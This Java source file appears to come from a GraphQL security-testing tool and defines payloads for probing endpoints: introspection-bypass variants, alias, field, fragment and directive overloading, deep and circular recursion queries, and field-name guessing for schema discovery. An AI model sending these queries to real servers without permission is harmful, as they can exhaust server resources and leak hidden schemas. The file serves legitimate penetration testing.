package com.grip.graphql.editor;

import com.grip.graphql.document.Argument;
import com.grip.graphql.document.Directive;
import com.grip.graphql.document.Value;

import java.nio.charset.StandardCharsets;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.util.ArrayList;
import java.util.List;

final class GraphQLPayloads {

    static final String TYPENAME_PROBE = "query { __typename }";

    static final String TYPENAME_MUTATION = "mutation { __typename }";

    static final String INTROSPECTION_PING = "query { __schema { queryType { name } } }";

    static final String TYPE_BYPASS = """
            query GripTypeBypass {
              __typename
              __type(name: "Query") { name kind fields { name type { name kind ofType { name } } } }
            }""";

    static final String DEFER_TEST = """
            query GripDeferTest {
              __schema {
                queryType {
                  name
                }
                ... @defer {
                  types {
                    name
                  }
                }
              }
            }""";

    static final String STREAM_TEST = """
            query GripStreamTest {
              __schema {
                types @stream(initialCount: 1) {
                  name
                  kind
                }
              }
            }""";

    static final String DIRECTIVE_DISCOVERY = """
            query GripDirectiveDiscovery {
              __schema {
                directives {
                  name
                  description
                  locations
                  args {
                    name
                    type { name kind }
                    defaultValue
                  }
                }
              }
            }""";

    static final String FINGERPRINT = """
            query GripFingerprint {
              __schema {
                queryType { name }
                mutationType { name }
                subscriptionType { name }
                directives { name locations args { name type { name kind } } }
              }
            }""";

    static final String TYPE_ENUMERATION = """
            query GripTypeEnum {
              user: __type(name: "User") { name fields { name } }
              account: __type(name: "Account") { name fields { name } }
              post: __type(name: "Post") { name fields { name } }
              order: __type(name: "Order") { name fields { name } }
              product: __type(name: "Product") { name fields { name } }
              admin: __type(name: "Admin") { name fields { name } }
              query: __type(name: "Query") { name fields { name } }
              mutation: __type(name: "Mutation") { name fields { name } }
            }""";

    static final String ERROR_TRIGGER =
            "query { __nonExistentField__12345(invalidArg: 999) { alsoInvalid } }";

    static final String SPECIAL_CHARS_OPERATION_NAME = "query _______GripSpecial_____ { __typename }";

    static final String UNICODE_OPERATION_NAME = "query Gripéèê { __typename }";

    static final String RESERVED_WORDS_OPERATION_NAME = "query query { __typename }";

    static final String BYPASS_NEWLINE = "query { __schema\n{ types { name } } }";

    static final String BYPASS_TAB = "query { __schema\t{ types { name } } }";

    static final String BYPASS_CRLF = "query { __schema\r\n{ types { name } } }";

    static final String BYPASS_FRAGMENT =
            "fragment SchemaFields on __Schema { types { name fields { name } } }\n"
                    + "query { __schema { ...SchemaFields } }";

    static final String BYPASS_INLINE_FRAGMENT = "query { ... { __schema { types { name } } } }";

    static final String BYPASS_ALIAS = "query { s: __schema { types { name } } }";

    static final String BYPASS_INCLUDE =
            "query($v: Boolean! = true) { __schema @include(if: $v) { types { name } } }";

    static final String BYPASS_SKIP =
            "query($v: Boolean! = false) { __schema @skip(if: $v) { types { name } } }";

    static final String BYPASS_GET = "{ __schema { types { name } } }";

    static final String FULL_INTROSPECTION = "query IntrospectionQuery { __schema { queryType { name } mutationType { name } subscriptionType { name } types { kind name description fields(includeDeprecated: true) { name description args { name description type { kind name ofType { kind name ofType { kind name ofType { kind name } } } } defaultValue } type { kind name ofType { kind name ofType { kind name ofType { kind name } } } } isDeprecated deprecationReason } inputFields { name description type { kind name ofType { kind name ofType { kind name } } } defaultValue } interfaces { kind name ofType { kind name } } enumValues(includeDeprecated: true) { name description isDeprecated deprecationReason } possibleTypes { kind name } } directives { name description locations args { name description type { kind name ofType { kind name } } defaultValue } } } }";

    private static final List<String> FIELD_NAME_GUESSES =
            List.of("usr", "userr", "getUser", "currentUsr", "me", "viewer", "accoun");

    private GraphQLPayloads() {
    }

    static String aliasOverloading(GraphQLOperationSource source, int count) {
        String call = rootCall(source);

        StringBuilder out = new StringBuilder();
        out.append(source.operationKeyword()).append(" GripAliasOverload {\n");
        for (int i = 0; i < count; i++) {
            out.append("  a").append(i).append(": ").append(indent(call)).append('\n');
        }
        return out.append('}').toString();
    }

    static String fieldDuplication(GraphQLOperationSource source, int count) {
        String call = rootCall(source);

        StringBuilder out = new StringBuilder();
        out.append(source.operationKeyword()).append(" GripFieldDuplication {\n");
        for (int i = 0; i < count; i++) {
            out.append("  ").append(indent(call)).append('\n');
        }
        return out.append('}').toString();
    }

    static String widthAttack(int count) {
        StringBuilder out = new StringBuilder("query GripWidthAttack {\n  __typename\n");
        for (int i = 0; i < count; i++) {
            out.append("  t").append(i).append(": __type(name: \"GripType").append(i)
                    .append("\") { name kind }\n");
        }
        return out.append('}').toString();
    }

    static String widthProbe(int width) {
        StringBuilder out = new StringBuilder("query GripWidthProbe").append(width).append(" {\n");
        for (int i = 0; i < width; i++) {
            out.append("  a").append(i).append(": __typename\n");
        }
        return out.append('}').toString();
    }

    static String fragmentOverloading(int count) {
        StringBuilder out = new StringBuilder();
        for (int i = 0; i < count; i++) {
            out.append("fragment f").append(i).append(" on __Schema { queryType { name } }\n");
        }

        out.append("\nquery GripFragmentOverload {\n  __schema {\n");
        for (int i = 0; i < count; i++) {
            out.append("    ...f").append(i).append('\n');
        }
        return out.append("  }\n}").toString();
    }

    static String deepRecursion(int depth) {
        StringBuilder out = new StringBuilder();
        out.append("query GripDeepRecursion {\n");
        out.append("  __schema {\n");
        out.append("    queryType {\n");
        out.append("      name\n");

        String pad = "      ";
        for (int i = 0; i < depth; i++) {
            out.append(pad).append("fields {\n");
            out.append(pad).append("  name\n");
            out.append(pad).append("  type {\n");
            out.append(pad).append("    name\n");
            pad += "    ";
        }

        for (int i = 0; i < depth; i++) {
            pad = pad.substring(0, pad.length() - 4);
            out.append(pad).append("  }\n");
            out.append(pad).append("}\n");
        }

        out.append("    }\n");
        out.append("  }\n");
        return out.append('}').toString();
    }

    static String circularIntrospection(int depth) {
        StringBuilder out = new StringBuilder();
        out.append("query GripCircularIntrospection {\n");
        out.append("  __schema {\n");
        out.append("    types {\n");
        out.append("      name\n");
        out.append("      kind\n");

        String pad = "      ";
        for (int i = 0; i < depth; i++) {
            out.append(pad).append("fields {\n");
            out.append(pad).append("  name\n");
            out.append(pad).append("  type {\n");
            out.append(pad).append("    name\n");
            out.append(pad).append("    kind\n");
            out.append(pad).append("    ofType {\n");
            out.append(pad).append("      name\n");
            pad += "      ";
        }

        for (int i = 0; i < depth; i++) {
            pad = pad.substring(0, pad.length() - 6);
            out.append(pad).append("    }\n");
            out.append(pad).append("  }\n");
            out.append(pad).append("}\n");
        }

        out.append("    }\n");
        out.append("  }\n");
        return out.append('}').toString();
    }

    static String depthProbe(int depth) {
        StringBuilder out = new StringBuilder();
        out.append("query GripDepthProbe").append(depth).append(" {\n");
        out.append("  __schema {\n");
        out.append("    types {\n");
        out.append("      name\n");

        String pad = "      ";
        for (int i = 0; i < depth; i++) {
            out.append(pad).append("fields {\n");
            out.append(pad).append("  name\n");
            out.append(pad).append("  type {\n");
            pad += "    ";
        }

        out.append(pad).append("name\n");

        for (int i = 0; i < depth; i++) {
            pad = pad.substring(0, pad.length() - 4);
            out.append(pad).append("  }\n");
            out.append(pad).append("}\n");
        }

        out.append("    }\n");
        out.append("  }\n");
        return out.append('}').toString();
    }

    static String aliasedMutations(GraphQLOperationSource source, int count) {
        String call = source.isMutation() && source.rootFieldCall() != null
                ? indent(source.rootFieldCall())
                : "__typename";

        StringBuilder out = new StringBuilder("mutation GripAliasedMutations {\n");
        for (int i = 0; i < count; i++) {
            out.append("  m").append(i).append(": ").append(call).append('\n');
        }
        return out.append('}').toString();
    }

    static String mutationFragments(GraphQLOperationSource source, int count) {
        String call = source.isMutation() && source.rootFieldCall() != null
                ? source.rootFieldCall().replace("\n", "\n    ")
                : "__typename";

        StringBuilder out = new StringBuilder("mutation GripMutationFragments {\n");
        for (int i = 0; i < count; i++) {
            out.append("  ... {\n    m").append(i).append(": ").append(call).append("\n  }\n");
        }
        return out.append('}').toString();
    }

    static String directiveOverloading(GraphQLOperationSource source, String directive, int count) {
        boolean include = "include".equals(directive);

        List<Directive> directives = new ArrayList<>();
        for (int i = 0; i < count; i++) {
            directives.add(flag(include ? "include" : "skip", include));
        }

        String name = "Grip" + directive.substring(0, 1).toUpperCase()
                + directive.substring(1) + "Overload";
        return directed(source, name, directives);
    }

    static String mixedDirectives(GraphQLOperationSource source, int count) {
        List<Directive> directives = new ArrayList<>();
        for (int i = 0; i < count; i++) {
            directives.add(i % 2 == 0 ? flag("include", true) : flag("skip", false));
        }
        return directed(source, "GripMixedDirectives", directives);
    }

    static String longOperationName() {
        return "query GripLongName" + "A".repeat(1000) + " { __typename }";
    }

    static String bypassLongOperationName() {
        return "query " + "A".repeat(500) + " { __schema { types { name } } }";
    }

    static String fieldSuggestionProbe(GraphQLOperationSource source) {
        StringBuilder out = new StringBuilder("query GripFieldProbe {\n");

        int alias = 0;
        for (String name : neighboursOf(source.rootFieldName())) {
            out.append("  n").append(alias++).append(": ").append(name).append(" { id }\n");
        }
        for (String name : FIELD_NAME_GUESSES) {
            out.append("  ").append(name).append(" { id }\n");
        }
        return out.append('}').toString();
    }

    static String sha256(String value) {
        try {
            MessageDigest digest = MessageDigest.getInstance("SHA-256");
            StringBuilder hex = new StringBuilder();
            for (byte b : digest.digest(value.getBytes(StandardCharsets.UTF_8))) {
                hex.append(String.format("%02x", b));
            }
            return hex.toString();
        } catch (NoSuchAlgorithmException e) {
            throw new IllegalStateException("SHA-256 is not available in this runtime", e);
        }
    }

    private static List<String> neighboursOf(String fieldName) {
        if (fieldName == null || fieldName.startsWith("__") || fieldName.length() < 3) {
            return List.of();
        }

        List<String> neighbours = new ArrayList<>();
        neighbours.add(fieldName.substring(0, fieldName.length() - 1));
        neighbours.add(fieldName + fieldName.charAt(fieldName.length() - 1));
        neighbours.add(fieldName + "s");
        neighbours.add("get" + fieldName.substring(0, 1).toUpperCase() + fieldName.substring(1));
        return neighbours;
    }

    private static String directed(GraphQLOperationSource source, String operationName,
                                   List<Directive> directives) {
        return source.operationKeyword() + " " + operationName + " {\n  "
                + indent(source.directedRootFieldCall(directives)) + "\n}";
    }

    private static Directive flag(String name, boolean value) {
        return new Directive(name, List.of(new Argument("if", new Value.BooleanValue(value))));
    }

    private static String rootCall(GraphQLOperationSource source) {
        String call = source.rootFieldCall();
        return call != null ? call : source.rootFieldName();
    }

    private static String indent(String call) {
        return call.replace("\n", "\n  ");
    }
}
